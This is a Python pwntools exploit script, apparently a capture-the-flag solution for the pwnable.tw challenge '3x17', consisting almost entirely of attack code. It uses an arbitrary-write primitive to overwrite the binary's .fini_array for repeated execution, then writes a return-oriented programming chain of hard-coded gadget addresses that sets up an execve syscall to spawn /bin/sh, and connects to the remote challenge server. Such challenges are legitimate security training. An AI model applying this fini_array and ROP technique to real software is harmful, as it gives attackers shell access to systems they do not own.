#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import sys
context.binary = "./3x17"
elf = context.binary

if sys.argv[1] == "l":
    io = process("./3x17")
else:
    io = remote("chall.pwnable.tw", 10105)

def write(addr, data):
    assert len(data) <= 0x18
    io.sendafter("addr:", str(addr))
    sleep(0.01)

    io.sendafter("data:", data)
    sleep(0.01)

def rop():
    idx = 0
    base = 0x4b40f8 + 0x8
    write(base + 0x300, '/bin/sh')

    write(base + idx * 8, flat(0x0000000000401e0b, base)); idx += 2         # rbx = base
    write(base + idx * 8, flat(0x0000000000401696, base + 0x300)); idx += 2 # rdi -> /bin/bash
    write(base + idx * 8, flat(0x0000000000406c30, 0)); idx += 2            # rsi = 0
    write(base + idx * 8, flat(0x0000000000446e35, 0)); idx += 2            # rdx = 0
    write(base + idx * 8, flat(0x000000000041e4af, 0x3b)); idx += 2         # rax = 0x3b
    write(base + idx * 8, flat(0x00000000004022b4)); idx += 1               # syscall

    #  gdb.attach(io, 'b *0x402988\nc')
    write(0x4B40F0, flat(0x0000000000401c4b, 0x0000000000401016))           # leave; ret; ret

if __name__ == "__main__":
    #  context.log_level = "debug"
    #  gdb.attach(io, 'b *0x402988\nc')
    write(0x4B40F0, flat(0x402960, 0x401b6d))
    rop()

    io.interactive()
